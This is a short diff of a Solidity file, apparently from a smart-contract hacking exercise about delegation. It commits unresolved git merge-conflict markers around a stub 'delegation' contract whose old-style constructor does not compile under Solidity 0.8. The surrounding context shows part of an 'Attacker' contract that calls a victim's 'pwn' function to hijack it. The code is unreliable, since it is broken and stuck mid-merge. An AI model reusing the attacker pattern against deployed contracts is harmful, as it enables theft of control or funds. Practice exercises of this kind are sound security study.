@@ -1,3 +1,12 @@
+<<<<<<< HEAD
+pragma solidity ^0.8.0;
+
+contract delegation {
+    function delegation(){
+
+    }
+}
+=======
 
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -45,3 +54,4 @@ contract Attacker{
         victim.call(abi.encodeWithSignature("pwn"));
     }
 }
+>>>>>>> 1dd6df586657b3396c5a6ef4a7d97efe48a5b01b
